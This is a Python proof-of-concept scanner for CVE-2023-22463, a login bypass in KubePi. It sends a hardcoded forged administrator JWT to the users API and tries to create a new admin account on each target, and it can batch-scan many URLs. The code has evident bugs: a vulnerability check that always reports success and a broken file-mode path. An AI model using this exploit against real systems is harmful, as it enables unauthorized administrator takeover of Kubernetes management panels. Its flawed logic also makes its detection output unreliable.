#KubePi JwtSigKey 登陆绕过漏洞 CVE-2023-22463
import argparse,requests,sys,random
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def poc(target):
    '''漏洞检测'''
    url = target + '/kubepi/api/v1/users'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36',
        'accept': 'application/json',
        'Accept-Encoding': 'gzip, deflate',
        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8'
        }
    data = {
        "authenticate": {
            "password": "{{randstr}}",

        },
        "email": "{{randstr}}@qq.com",
        "isAdmin": bool(1),
        "mfa": {
                "enable": "false",
        },
        "name": "{{randstr}}",
        "nickName": "{{randstr}}",
        "roles": [
            "Supper User",
        ]
        }
    try:
        res = requests.post(url=url,headers=headers,json=data,timeout=5,verify=False)
        # print(res.text)
        if '用户名已存在' or 'password' in res.text:
            print('[+]'+target+'存在KubePi JwtSigKey 登陆绕过漏洞 CVE-2023-22463')

        else:
            print('不存在KubePi JwtSigKey 登陆绕过漏洞 CVE-2023-22463')
    except:
        print('未知错误')
def exp():
    '''漏洞利用'''
    pass
def banner():
    banner = '''
                                                   
                                               
  /$$$$$$   /$$$$$$$ /$$$$$$$ /$$$$$$$ /$$$$$$$
 |____  $$ /$$_____//$$_____//$$_____//$$_____/
  /$$$$$$$|  $$$$$$|  $$$$$$|  $$$$$$|  $$$$$$ 
 /$$__  $$ \____  $$\____  $$\____  $$\____  $$
|  $$$$$$$ /$$$$$$$//$$$$$$$//$$$$$$$//$$$$$$$/
 \_______/|_______/|_______/|_______/|_______/ 
                                               
                                               
                                               作者:qbt
                                               版本:0.1
    '''
    print(banner)
'''主函数'''
def main():
    banner()
    parser = argparse.ArgumentParser(description="KubePi JwtSigKey 登陆绕过漏洞 CVE-2023-22463")
    parser.add_argument("-u","--url",dest='url',help="Please enter url",type=str)
    parser.add_argument("-f","--file",dest='file',help="Please use file",type=str)
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif  not args.url and args.file:
        url_list = []
        with open(url.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp = (poc,url_list)
        mp = mp.close()
        mp = mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
if __name__ == '__main__':
    main()


